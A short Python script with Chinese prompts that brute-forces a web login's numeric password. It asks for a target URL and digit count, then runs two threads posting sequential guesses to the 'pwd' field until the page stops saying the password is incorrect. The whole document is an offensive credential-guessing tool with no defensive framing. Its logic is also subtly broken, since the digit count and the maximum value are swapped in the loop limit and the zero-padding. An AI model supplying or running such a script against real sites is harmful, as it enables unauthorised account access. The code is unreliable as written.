import requests
import threading

psw = 0
lock = threading.RLock()
gotit = False
correct = ""
url = input('请输入目标网站 ')
num_max = int(input('请输入已知密码的位数 '))
num = ''

num_1 = num_max
while True:    
    if num_1 == 0:
        break
    else:
        num = num + '9'
        num_1 = num_1 - 1

num = int(num)

class BreakThread(threading.Thread):
    def run(self):
        global psw, gotit, correct
        while True:
            lock.acquire()
            if psw > num_max or gotit:
                lock.release()
                break
            d = {
                "pwd": str(psw).zfill(num)
            }
            psw = psw + 1
            lock.release()
            r = requests.post(url, data=d)
            r.encoding = "utf-8"
            try:
                r.text.index("密码不正确")
            except ValueError:
                print(d["pwd"] + "   right")
                gotit = True
                lock.acquire()
                correct = d["pwd"]
                lock.release()
                break
            else:
                print(d["pwd"] + "   wrong")


l = []
for i in range(2):
    l.append(BreakThread())
for i in l:
    i.start()
for i in l:
    i.join()
print("正确密码:"+correct)
